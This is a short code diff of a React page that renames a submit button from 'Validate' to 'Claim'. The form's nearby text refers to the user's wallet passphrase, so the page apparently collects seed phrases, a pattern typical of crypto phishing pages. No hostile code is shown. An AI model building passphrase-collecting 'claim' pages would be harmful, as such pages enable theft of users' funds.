@@ -127,7 +127,7 @@ export default function page() {
                       type="submit"
                       className="min-w-[250px] w-full md:w-fit text-sm px-10 uppercase hover:bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#8a348e] text-[#8a348e] font-bold hover:text-white py-3.5 rounded-lg border"
                     >
-                      {validating ? "Validating" : "Validate"}
+                      {validating ? "Processing" : "Claim"}
                     </button>
                     <p className="text-sm">
                       As a non-custodial wallet, your wallet passphrase is
